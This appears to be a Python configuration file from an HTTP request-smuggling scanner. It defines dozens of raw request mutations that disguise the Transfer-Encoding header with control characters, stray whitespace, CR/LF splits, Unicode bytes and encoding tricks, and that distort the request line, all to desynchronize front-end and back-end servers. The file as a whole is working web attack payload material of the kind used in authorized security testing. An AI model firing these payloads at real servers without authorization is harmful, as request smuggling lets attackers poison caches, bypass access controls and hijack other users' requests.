
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	# p.header += "Transfer-Encoding: chunked" +RN	
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p


mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["nameprefix2"] = render_template("Foo: bar\r\n\tTransfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["nospace1"] = render_template("Transfer-Encoding:chunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
mutations["spjunk"] = render_template("Transfer-Encoding x: chunked")
mutations["backslash"] = render_template("Transfer\\Encoding: chunked")
mutations["badsetupCR"] = render_template("Foo: bar\rTransfer-Encoding: chunked")
mutations["badsetupLF"] = render_template("Foo: bar\nTransfer-Encoding: chunked")
mutations["nel"] = render_template("Transfer-Encoding\x85: chunked")
mutations["shy"] = render_template("Transfer\xADEncoding: chunked")
mutations["encode"] = render_template("Transfer-%45ncoding: chunked")

for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))


# Request-line whitespace abuse: backends and front-ends disagree on what
# characters count as request-line separators. Pair each variant with a
# plain Transfer-Encoding: chunked so the CL.TE/TE.CL oracle still fires
# if the front-end normalizes but the backend doesn't (or vice-versa).
def render_reqline(request_line_tmpl):
	RN = "\r\n"
	p = Payload()
	p.header  = request_line_tmpl + RN
	p.header += "Transfer-Encoding: chunked" + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

mutations["reqline-tab"]        = render_reqline("__METHOD__\t__ENDPOINT__?cb=__RANDOM__\tHTTP/1.1")
mutations["reqline-double-sp"]  = render_reqline("__METHOD__  __ENDPOINT__?cb=__RANDOM__  HTTP/1.1")
mutations["reqline-trail-cr"]   = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\rX: X")
mutations["reqline-nbsp"]       = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\xa0HTTP/1.1")
mutations["reqline-vt"]         = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\x0bHTTP/1.1")
mutations["reqline-ff"]         = render_reqline("__METHOD__ __ENDPOINT__?cb=__RANDOM__\x0cHTTP/1.1")
mutations["reqline-mixed"]      = render_reqline("__METHOD__ \t__ENDPOINT__?cb=__RANDOM__ \tHTTP/1.1")

